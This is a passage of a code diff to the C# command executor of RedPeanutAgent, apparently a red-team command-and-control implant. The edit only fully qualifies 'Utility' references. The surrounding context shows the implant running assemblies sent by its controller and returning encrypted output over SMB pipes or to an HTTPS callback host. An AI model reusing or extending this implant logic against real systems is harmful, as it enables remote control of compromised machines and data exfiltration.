@@ -16,15 +16,15 @@ namespace RedPeanutAgent.Execution
 {
     class CommandExecuter
     {
-        Utility.TaskMsg task;
+        RedPeanutAgent.Core.Utility.TaskMsg task;
         NamedPipeClientStream pipe;
-        Utility.CookiedWebClient wc;
+        RedPeanutAgent.Core.Utility.CookiedWebClient wc;
         byte[] aeskey;
         byte[] aesiv;
         string agentid;
         string processname;
 
-        public CommandExecuter(Utility.TaskMsg task, NamedPipeClientStream pipe, Utility.CookiedWebClient wc, byte[] aeskey, byte[] aesiv, string agentid, string processname)
+        public CommandExecuter(RedPeanutAgent.Core.Utility.TaskMsg task, NamedPipeClientStream pipe, Utility.CookiedWebClient wc, byte[] aeskey, byte[] aesiv, string agentid, string processname)
         {
             this.task = task;
             this.pipe = pipe;
@@ -45,11 +45,11 @@ namespace RedPeanutAgent.Execution
             string rpaddress = String.Format("https://{0}:{1}/{2}", Program.host, Program.port, Program.pagepost[new Random().Next(Program.pagepost.Length)]);
             if (pipe != null)
             {
-                Utility.SendOutputSMB(output, aeskey, aesiv, pipe);
+                RedPeanutAgent.Core.Utility.SendOutputSMB(output, aeskey, aesiv, pipe);
             }
             else
             {
-                Utility.SendOutputHttp(task.Instanceid, output, wc, aeskey, aesiv, rpaddress, Program.param, agentid);
+                RedPeanutAgent.Core.Utility.SendOutputHttp(task.Instanceid, output, wc, aeskey, aesiv, rpaddress, Program.param, agentid);
             }
         }
 
@@ -106,21 +106,21 @@ namespace RedPeanutAgent.Execution
                         assembly = task.StandardTask.Assembly;
                         method = task.StandardTask.Method;
                         paramsv = task.StandardTask.Parameters;
-                        Utility.RunAssembly(assembly, classname, method, new object[] { paramsv });
+                        RedPeanutAgent.Core.Utility.RunAssembly(assembly, classname, method, new object[] { paramsv });
                         break;
                     case "download":
                         classname = task.DownloadTask.Moduleclass;
                         assembly = task.DownloadTask.Assembly;
                         method = task.DownloadTask.Method;
                         paramsv = task.DownloadTask.Parameters;
-                        Utility.RunAssembly(assembly, classname, method, new object[] { paramsv });
+                        RedPeanutAgent.Core.Utility.RunAssembly(assembly, classname, method, new object[] { paramsv });
                         break;
                     case "module":
                         classname = task.ModuleTask.Moduleclass;
                         assembly = task.ModuleTask.Assembly;
                         method = task.ModuleTask.Method;
                         paramsv = task.ModuleTask.Parameters;
-                        Utility.RunAssembly(assembly, classname, method, new object[] { paramsv });
+                        RedPeanutAgent.Core.Utility.RunAssembly(assembly, classname, method, new object[] { paramsv });
                         break;
                 }
 
